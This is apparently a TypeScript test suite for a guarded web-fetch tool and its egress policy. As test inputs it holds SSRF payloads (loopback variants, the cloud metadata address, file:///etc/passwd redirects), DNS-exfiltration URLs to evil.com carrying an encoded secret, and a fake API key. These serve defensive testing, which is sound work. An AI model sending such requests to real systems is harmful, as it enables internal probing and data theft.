import assert from 'node:assert/strict';
import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import { after, before, describe, it } from 'node:test';
import { EgressPolicy } from '@hn/security';
import { fetchInChildProcess, fetchOnce, webFetch, workerEnvironment, type HopRequest, type Resolver } from '@hn/operations';

interface Seen {
  url: string;
  headers: IncomingMessage['headers'];
}

let server: Server;
let port = 0;
const seen: Seen[] = [];
let handler: (request: IncomingMessage, response: ServerResponse) => void = (_request, response) => response.end('ok');

before(async () => {
  server = createServer((request, response) => {
    seen.push({ url: request.url ?? '', headers: request.headers });
    handler(request, response);
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  port = (server.address() as AddressInfo).port;
});

after(() => {
  server.closeAllConnections();
  server.close();
});

const reset = (next?: typeof handler): void => {
  seen.length = 0;
  handler = next ?? ((_request, response) => response.end('ok'));
};

const hop = (url: string, extra: Partial<HopRequest> = {}): HopRequest => ({ url, maxBytes: 1 << 20, timeoutMs: 5_000, ...extra });
const resolves = (answers: Record<string, string[]>, calls: string[] = []): Resolver => async (host) => {
  calls.push(host);
  const answer = answers[host];
  if (answer === undefined) throw new Error('no such host');
  return answer;
};

describe('refusals that never reach a server', () => {
  it('attack: ssrf_metadata_and_loopback_blocked (an address, however written)', async () => {
    reset();
    for (const url of [`http://127.0.0.1:${port}/`, `http://127.1:${port}/`, `http://2130706433:${port}/`, `http://[::1]:${port}/`, `http://localhost:${port}/`, 'https://169.254.169.254/latest/meta-data/', 'https://[fd00:ec2::254]/']) {
      const result = await fetchOnce(hop(url, { allowHttp: true, allowedPorts: [port, 80, 443] }));
      assert.equal(result.kind, 'refused', url);
    }
    assert.equal(seen.length, 0, 'a request reached the local server');
  });

  it('attack: a name that resolves to a private address is refused, mixed answers included', async () => {
    reset();
    const resolver = resolves({
      'rebind.example.com': ['127.0.0.1'],
      'mixed.example.com': ['93.184.216.34', '127.0.0.1'],
      'mapped.example.com': ['::ffff:127.0.0.1'],
      'meta.example.com': ['169.254.169.254'],
      'lan.example.com': ['192.168.1.10'],
      'wrapped.example.com': ['::ffff:a00:1'],
    });
    for (const host of ['rebind', 'mixed', 'mapped', 'meta', 'lan', 'wrapped']) {
      const result = await fetchOnce(hop(`http://${host}.example.com:${port}/`, { allowHttp: true, allowedPorts: [port] }), resolver);
      assert.equal(result.kind, 'refused', host);
      assert.match(result.kind === 'refused' ? result.reason : '', /resolves to/, host);
    }
    assert.equal(seen.length, 0, 'a request reached the local server');
  });

  it('attack: dns_subdomain_exfil_blocked_pre_resolve (the resolver is never asked)', async () => {
    reset();
    const calls: string[] = [];
    const resolver = resolves({}, calls);
    for (const url of [`https://${'a'.repeat(50)}.evil.com/`, 'https://dGhpcy1pcy1hLXNlY3JldC1rZXktMTIzNDU2Nzg5MA.evil.com/', 'https://localhost/', 'https://intranet/', 'http://example.com/']) {
      assert.equal((await fetchOnce(hop(url), resolver)).kind, 'refused', url);
    }
    assert.deepEqual(calls, [], 'a name that carried data was looked up');
  });

  it('refuses a name that does not resolve, and a refusal says why', async () => {
    const result = await fetchOnce(hop('https://nothing.example.com/'), resolves({}));
    assert.deepEqual(result, { kind: 'refused', reason: 'nothing.example.com did not resolve.' });
  });
});

describe('a request that is allowed', () => {
  const allow = { allowHttp: true, allowedPorts: [port], unsafeAllowLoopbackForTests: true } as const;
  const flags = (): Partial<HopRequest> => ({ allowHttp: true, allowedPorts: [port], unsafeAllowLoopbackForTests: true });

  it('connects to the address that was checked, whatever the name would mean, and asks the resolver once', async () => {
    reset((_request, response) => {
      response.writeHead(200, { 'content-type': 'text/plain' });
      response.end('hello from the pinned address');
    });
    const calls: string[] = [];
    const result = await fetchOnce(hop(`http://site.example.com:${port}/page?x=1`, flags()), resolves({ 'site.example.com': ['127.0.0.1'] }, calls));
    assert.equal(result.kind, 'response');
    if (result.kind === 'response') assert.equal(result.body.toString(), 'hello from the pinned address');
    assert.deepEqual(calls, ['site.example.com'], 'the name was looked up more than once, so it could change its answer');
    assert.equal(seen[0]?.url, '/page?x=1');
    assert.equal(seen[0]?.headers.host, `site.example.com:${port}`, 'the request must still name the site');
    void allow;
  });

  it('sends nothing that identifies the user: no cookies, credentials, referrer or compression', async () => {
    reset();
    await fetchOnce(hop(`http://site.example.com:${port}/`, flags()), resolves({ 'site.example.com': ['127.0.0.1'] }));
    const headers = seen[0]?.headers ?? {};
    for (const name of ['cookie', 'authorization', 'proxy-authorization', 'referer', 'origin', 'x-api-key']) assert.equal(headers[name], undefined, name);
    assert.equal(headers['accept-encoding'], 'identity');
    assert.equal(headers['user-agent'], 'hn/0.0.0');
  });

  it('refuses a body that is not text, without downloading it', async () => {
    reset((_request, response) => {
      response.writeHead(200, { 'content-type': 'image/png' });
      response.end(Buffer.alloc(4096, 1));
    });
    const result = await fetchOnce(hop(`http://site.example.com:${port}/x.png`, flags()), resolves({ 'site.example.com': ['127.0.0.1'] }));
    assert.equal(result.kind, 'refused');
    assert.match(result.kind === 'refused' ? result.reason : '', /image\/png is not text/);
  });

  it('cuts a very large response at the limit and says so', async () => {
    reset((_request, response) => {
      response.writeHead(200, { 'content-type': 'text/plain' });
      response.end('x'.repeat(1_000_000));
    });
    const result = await fetchOnce(hop(`http://site.example.com:${port}/big`, { ...flags(), maxBytes: 1_000 }), resolves({ 'site.example.com': ['127.0.0.1'] }));
    assert.equal(result.kind, 'response');
    if (result.kind === 'response') assert.deepEqual([result.body.length, result.truncated], [1_000, true]);
  });

  it('gives up on a server that never answers', async () => {
    reset(() => undefined);
    const started = Date.now();
    const result = await fetchOnce(hop(`http://site.example.com:${port}/slow`, { ...flags(), timeoutMs: 400 }), resolves({ 'site.example.com': ['127.0.0.1'] }));
    assert.equal(result.kind, 'refused');
    assert.match(result.kind === 'refused' ? result.reason : '', /longer than 400 ms/);
    assert.ok(Date.now() - started < 3_000);
  });

  it('returns a redirect instead of following it, and reports other statuses as they are', async () => {
    reset((request, response) => {
      if (request.url === '/moved') response.writeHead(302, { location: '/there' }).end();
      else response.writeHead(404, { 'content-type': 'text/plain' }).end('not found');
    });
    const resolver = resolves({ 'site.example.com': ['127.0.0.1'] });
    assert.deepEqual(await fetchOnce(hop(`http://site.example.com:${port}/moved`, flags()), resolver), { kind: 'redirect', status: 302, location: '/there' });
    const missing = await fetchOnce(hop(`http://site.example.com:${port}/nope`, flags()), resolver);
    assert.equal(missing.kind === 'response' ? missing.status : 0, 404);
    assert.equal(seen.length, 2);
  });
});

describe('following redirects, one hop at a time', () => {
  const resolver = resolves({ 'a.example.com': ['127.0.0.1'], 'b.example.com': ['127.0.0.1'] });
  const run = (url: string, policy = new EgressPolicy({ allowHttp: true }), extra: Partial<Parameters<typeof webFetch>[1]> = {}) =>
    webFetch(url, { policy, allowHttp: true, allowedPorts: [port], unsafeAllowLoopbackForTests: true, runHop: (request) => fetchOnce(request, resolver), ...extra });

  it('follows relative and absolute redirects and lists each hop', async () => {
    reset((request, response) => {
      if (request.url === '/a') response.writeHead(302, { location: '/b' }).end();
      else if (request.url === '/b') response.writeHead(301, { location: `http://b.example.com:${port}/c` }).end();
      else response.writeHead(200, { 'content-type': 'text/plain' }).end(`arrived at ${request.headers.host}${request.url}`);
    });
    const result = await run(`http://a.example.com:${port}/a`);
    assert.equal(result.ok, true);
    if (result.ok) {
      assert.equal(result.text, `arrived at b.example.com:${port}/c`);
      assert.deepEqual(result.redirects, [`http://a.example.com:${port}/b`, `http://b.example.com:${port}/c`]);
    }
  });

  it('attack: redirect_revalidated (a redirect to an internal address is refused before anything connects)', async () => {
    for (const target of ['http://169.254.169.254/latest/meta-data/', `http://127.0.0.1:${port}/admin`, 'file:///etc/passwd', 'http://localhost:9999/', 'https://[::1]/', 'ftp://example.com/']) {
      reset((_request, response) => response.writeHead(302, { location: target }).end());
      const result = await run(`http://a.example.com:${port}/start`, new EgressPolicy({ allowHttp: true }), { unsafeAllowLoopbackForTests: false, allowedPorts: [port] }).catch((error) => ({ ok: false as const, reason: String(error), redirects: [] }));
      assert.equal(result.ok, false, target);
    }
    // The only request that reached the server was the first one for each target.
    assert.ok(seen.every((entry) => entry.url === '/start'), 'a request followed a redirect into a blocked place');
  });

  it('holds every hop to the taint rule: under taint, a redirect to a URL the user never typed is refused', async () => {
    reset((request, response) => {
      if (request.url === '/a') response.writeHead(302, { location: `http://b.example.com:${port}/landing` }).end();
      else response.writeHead(200, { 'content-type': 'text/plain' }).end('landed');
    });
    const policy = new EgressPolicy({ allowHttp: true, allowedPorts: [port], tainted: () => true });
    policy.noteUserText(`read http://a.example.com:${port}/a please`);
    const result = await run(`http://a.example.com:${port}/a`, policy);
    assert.equal(result.ok, false);
    assert.match(result.ok ? '' : result.reason, /redirect to .* was refused/);
    assert.deepEqual(seen.map((entry) => entry.url), ['/a'], 'the redirect target was requested');
  });

  it('stops a redirect loop', async () => {
    reset((_request, response) => response.writeHead(302, { location: `http://a.example.com:${port}/again` }).end());
    const result = await run(`http://a.example.com:${port}/again`, new EgressPolicy({ allowHttp: true, perHostPerDay: 100 }));
    assert.equal(result.ok, false);
    assert.match(result.ok ? '' : result.reason, /More than 5 redirects/);
  });

  it('spends a host\'s daily budget on each hop, and refuses a hop once it is gone', async () => {
    reset((_request, response) => response.writeHead(200, { 'content-type': 'text/plain' }).end('ok'));
    const policy = new EgressPolicy({ allowHttp: true, perHostPerDay: 2 });
    assert.equal((await run(`http://a.example.com:${port}/1`, policy)).ok, true);
    assert.equal((await run(`http://a.example.com:${port}/2`, policy)).ok, true);
    const third = await run(`http://a.example.com:${port}/3`, policy);
    assert.equal(third.ok, false);
    assert.match(third.ok ? '' : third.reason, /daily limit/);
    assert.equal(seen.length, 2, 'a refused request was still sent');
  });

  it('does not contact the server when the policy refuses', async () => {
    reset();
    const policy = new EgressPolicy({ allowHttp: true, tainted: () => true });
    const result = await run(`http://a.example.com:${port}/secret?d=STOLEN`, policy);
    assert.equal(result.ok, false);
    assert.equal(seen.length, 0);
  });
});

describe('the separate process', () => {
  it('has no environment that could hold a key', () => {
    const before = process.env['ANTHROPIC_API_KEY'];
    process.env['ANTHROPIC_API_KEY'] = 'sk-ant-api03-Zq8vN2mXk4Lp7TrW9yBc3Dh6Fj1Gs5Aa';
    process.env['HN_SECRET_TOKEN'] = 'abc';
    try {
      const env = workerEnvironment();
      assert.deepEqual(Object.keys(env).filter((name) => !['SystemRoot', 'windir'].includes(name)), [], 'the child would inherit something');
      assert.equal(JSON.stringify(env).includes('sk-ant'), false);
    } finally {
      if (before === undefined) delete process.env['ANTHROPIC_API_KEY'];
      else process.env['ANTHROPIC_API_KEY'] = before;
      delete process.env['HN_SECRET_TOKEN'];
    }
  });

  it('makes a real request in a child process and returns the body', async () => {
    reset((_request, response) => response.writeHead(200, { 'content-type': 'text/plain; charset=utf-8' }).end('from a child process'));
    const result = await fetchInChildProcess(hop(`http://127.0.0.1:${port}/hi`, { allowHttp: true, allowedPorts: [port], unsafeAllowLoopbackForTests: true }));
    assert.equal(result.kind, 'response');
    if (result.kind === 'response') {
      assert.equal(result.body.toString(), 'from a child process');
      assert.equal(result.status, 200);
    }
    assert.equal(seen[0]?.headers.cookie, undefined);
  });

  it('refuses in the child exactly as in the parent, with nothing sent', async () => {
    reset();
    const result = await fetchInChildProcess(hop(`http://127.0.0.1:${port}/hi`, { allowHttp: true, allowedPorts: [port] }));
    assert.equal(result.kind, 'refused');
    assert.equal(seen.length, 0, 'the child reached a loopback server without the test flag');
    assert.equal((await fetchInChildProcess(hop('https://169.254.169.254/'))).kind, 'refused');
  });

  it('gives up when the child is stuck', async () => {
    reset(() => undefined);
    const started = Date.now();
    const result = await fetchInChildProcess(hop(`http://127.0.0.1:${port}/slow`, { allowHttp: true, allowedPorts: [port], unsafeAllowLoopbackForTests: true, timeoutMs: 500 }));
    assert.equal(result.kind, 'refused');
    assert.ok(Date.now() - started < 8_000);
  });
});
